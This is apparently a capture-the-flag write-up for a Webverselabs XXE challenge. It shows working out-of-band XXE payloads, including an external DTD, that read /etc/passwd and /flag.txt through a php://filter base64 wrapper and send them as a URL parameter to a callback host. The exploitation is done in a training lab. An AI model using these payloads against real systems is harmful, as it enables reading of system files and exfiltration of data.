---
title: "Webverselabs Exfil Challenge XXE  "
date: 2026-06-12 00:00:00 +0000
categories: [Webverselabs]
tags: [Webverselabs , Hard , Challenge , Web_Attacks ]
---


## Scenario : 

Exfil Analytics processes thousands of reports daily. Their submission pipeline accepts uploads and confirms receipt, but never reveals what happens inside. You'll need to find another way to see what the server knows.

## Solution : 

First we navigate the application just like a normal user, we're trying to explore different endpoints, features, etc . 

<img width="1739" height="853" alt="image" src="https://github.com/user-attachments/assets/f5e39089-1cea-4942-8baf-596fe90c7932" />

The dashboard is a static web page that returns an overview on the financial state of the company. 

**/Reports :**

In the report section , we are able to view submitted reports , we also have the possibility to upload a new report : 

<img width="1576" height="782" alt="image" src="https://github.com/user-attachments/assets/941a5a3a-6d55-4958-801a-667f84934a6c" />

If we try uploading a new report it just takes us to the Sbumit Report Endpoint . 

**/Submit Report :**

<img width="1726" height="824" alt="image" src="https://github.com/user-attachments/assets/6289a6ba-bf2d-4125-bba9-749c7c391113" />

This is where we can upload our reports in an XML format , before digging deeper , we'll finish exploring the app so that we don't leave anything behind. 

**/Integration :**

<img width="1726" height="883" alt="image" src="https://github.com/user-attachments/assets/8df5693a-d924-4be1-8312-9b0b488f3f2d" />

This is just a static page that returns information about the services we can integrate . 

**/Settings :**

<img width="1613" height="817" alt="image" src="https://github.com/user-attachments/assets/9bc5651b-9a41-4803-a580-5786148ab8b5" />

And Finally the settings which are not useful to us at all here :) 

Now let's go back to the **Report Submition** , since it accepts XML files , your first instinct should be to try an XXE, but before we do that we first upload a legit XML file to see how the application behaves :

What fields are returned to us, do we cause an error if we add a field that shouldn't exist, etc. 

I first uploaded this xml file : 

```xml
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "test hh">
]>
<root>
<NAME>&xxe;</NAME>
<TYPE>AAAAA</TYPE>
<email>&company;</email>
</root>
```
<img width="574" height="315" alt="image" src="https://github.com/user-attachments/assets/1112cd87-2adb-4d13-a2ab-5eda76b81d2e" />

Once we submit it , we get this page : 

<img width="1346" height="557" alt="image" src="https://github.com/user-attachments/assets/11f8fb06-e946-437f-b869-473e109d7f73" />

But if we try to view the Reports, it doesn't show anything . 

<img width="1522" height="759" alt="image" src="https://github.com/user-attachments/assets/325d7b70-87c8-47b5-9ce6-768cd22d980d" />

Whenever we submit the file and the app doesn't return anything, the only way we can test is via an Out Of Band XXE (OOB) .

Now for this we need an external Server that we control and are able to view different requests made to it . 

Usually you would either Burp Collaborator , set up your own PHP Server locally and try to call it , or use Webhook URL , in our case Webverselabs already gives us a dedicated server that we can use for this. 

We can view whether or not our XXE worked by checking if we actually get a request back to our server . 

<img width="1848" height="426" alt="image" src="https://github.com/user-attachments/assets/f9a2c763-77cb-482a-a756-48218850cdf7" />

I have a detailed section in my web pentesting methodology which i will be following : 

```bash
https://elmehdilaassiri.github.io/posts/web-app-pentesting-methodology/#xxe--out-of-band-
```

So to explain a bit what we're going to do , first we will craft an xml file where we will add a new External Entity inside the DTD that we're going to reference it when parsing the request. 

```bash
+ What's a DTD? It defines the structure of the XML Doc , it can be inside the XML file
or External ( Via SYSTEM or PUBLIC file.dtd ) 
+ Think of it like Initiating variables , you say company is XXX 
	== Call &company and it will give it the value XXX .
```

Now First to test for an OOB XXE , we will need to use SYSTEM to go fetch for external resources , in this case it will be our Server that we're given by Webverslabs.

Then after that we will check if we find any requests made to that server . Here is the XML code :

```xml
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "http://bbdc2e13-4327-exfil-411e3.interact.webverselabs-pro.com">
]>
<root>
<NAME>&xxe;</NAME>
<TYPE>AAAAA</TYPE>
<email>&company;</email>
</root>
```
<img width="1160" height="404" alt="image" src="https://github.com/user-attachments/assets/d7f5ff9c-9164-45a4-b750-ec7e79451476" />

Now we just upload it : 

<img width="1365" height="615" alt="image" src="https://github.com/user-attachments/assets/fd9f2f8a-1a8e-4747-b1ca-fe513fff7868" />

If we check our Server : 

<img width="1881" height="676" alt="image" src="https://github.com/user-attachments/assets/636a710a-bbe4-458f-9a2e-dc29e776110a" />

We see that we get our callback . 

Now we can abuse this to have Data Exfiltration :

```xml
1 / First we create the File : 
+ It will consist of 2 parts , the file we want to read and the server to send the output 
of what we re reading . 

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://bbdc2e13-4327-exfil-411e3.interact.webverselabs-pro.com/?content=%file;'>"> 

2/ Inject the XML Entity : 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://bbdc2e13-4327-exfil-411e3.interact.webverselabs-pro.com/__p__/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

The concept here is :

- First our %remote will be parsed and using SYSTEM it will callback our server to search for the xxe.dtd file .
- From there it will parse the %file which will store the content of /etc/passwd in a base64 format .
- Then %oob; is called which expands the %oob entity and declares the &content; general entity, with %file; already substituted inside the URL .
- Then we finally reference the &content; entity and from there it will connect back to our machine and pass the content as a parameter .
- From there we can easily decode the content and get the file .

First let's host the file : 

<img width="1899" height="690" alt="image" src="https://github.com/user-attachments/assets/7ab8c021-8cd7-4931-8db9-69461f8c82e3" />

Now let's upload the file : 

<img width="1349" height="374" alt="image" src="https://github.com/user-attachments/assets/d3433481-db7d-4bd2-9a04-35126072f5fc" />

Now back on our Server : 

<img width="1876" height="814" alt="image" src="https://github.com/user-attachments/assets/4f74d628-ea8a-4764-861a-4979b1e3f74d" />

Perfect we get the callback with the content parameter , from there we can just decode it and get the content : 

<img width="1404" height="770" alt="image" src="https://github.com/user-attachments/assets/a8d11b4e-2213-4d1f-a46a-2625521cf292" />

From here we can get the flag the same way , we just specify the file to be /flag.txt instead of the passwd file . 

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
```

<img width="1807" height="598" alt="image" src="https://github.com/user-attachments/assets/047a5097-8f0b-4442-af17-ed3053dae582" />

Now we just upload it and check the server : 

<img width="1850" height="728" alt="image" src="https://github.com/user-attachments/assets/0108b8af-1ddf-4803-ac29-d4ce3a1138d8" />

Now we just decode it : 

<img width="1216" height="294" alt="image" src="https://github.com/user-attachments/assets/5808551e-8a12-4b13-9532-efe318073302" />

That was all for this challenge , See you in the next one :) 
